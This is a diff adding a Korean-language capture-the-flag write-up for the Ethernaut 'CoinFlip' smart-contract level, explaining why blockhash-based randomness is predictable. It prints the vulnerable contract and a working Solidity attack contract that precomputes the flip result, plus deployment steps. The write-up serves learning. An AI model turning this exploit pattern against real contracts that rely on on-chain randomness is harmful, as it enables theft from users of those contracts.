@@ -250,7 +250,7 @@ await contract.owner()
 
 ### 문제 요약
 
-작성 예정.
+동전 던지기를 10번 연속 맞히면 클리어된다. 문제는 랜덤값이 실제 난수가 아니라 블록 정보로 계산된 예측 가능한 값이라는 점이다.
 
 ### 핵심
 
@@ -258,19 +258,116 @@ await contract.owner()
 - `blockhash`
 - 예측 가능한 상태값
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+    uint256 public consecutiveWins;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor() {
+        consecutiveWins = 0;
+    }
+
+    function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side == _guess) {
+            consecutiveWins++;
+            return true;
+        } else {
+            consecutiveWins = 0;
+            return false;
+        }
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+`flip()`은 이전 블록 해시를 숫자로 바꾼 뒤 `FACTOR`로 나눈다.
+
+```solidity
+uint256 blockValue = uint256(blockhash(block.number - 1));
+uint256 coinFlip = blockValue / FACTOR;
+bool side = coinFlip == 1 ? true : false;
+```
+
+이 값은 같은 블록 안에서 누구나 똑같이 계산할 수 있다. 그래서 공격 컨트랙트에서 동일한 계산을 먼저 하고, 나온 값을 그대로 `flip()`에 넘기면 된다.
+
+단, `lastHash` 검사 때문에 같은 블록에서 여러 번 호출할 수 없다.
+
+```solidity
+if (lastHash == blockValue) {
+    revert();
+}
+```
+
+따라서 공격 함수는 블록마다 한 번씩 총 10번 호출한다.
 
 ### 공격 코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract CoinFlipAttack {
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    ICoinFlip private immutable target;
+
+    constructor(address targetAddress) {
+        target = ICoinFlip(targetAddress);
+    }
+
+    function attack() external {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool guess = coinFlip == 1;
+
+        target.flip(guess);
+    }
+}
 ```
+
+여기서 어떻게 하는지 몰라서 시간이 좀 걸렸다...
+
+Remix IDE에 파일을 만들고 위 코드넣어서 compile 하고 지갑연결하고 어쩌고저쩌고
+
+타겟주소 = 문제 인스턴스 주소
+
+해서
+
+Deploy
+
+배포 후 `attack()`을 10개 블록에 걸쳐 10번 실행한다.
+
+```javascript
+await contract.consecutiveWins()
+```
+
+값이 `10`이면 인스턴스를 제출하면 된다.
 
 ### 정리
 
-작성 예정.
+블록 해시, 타임스탬프 같은 온체인 값은 난수로 쓰면 안 된다. 모든 참여자가 같은 값을 읽고 같은 결과를 미리 계산할 수 있다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Telephone" markdown="1">
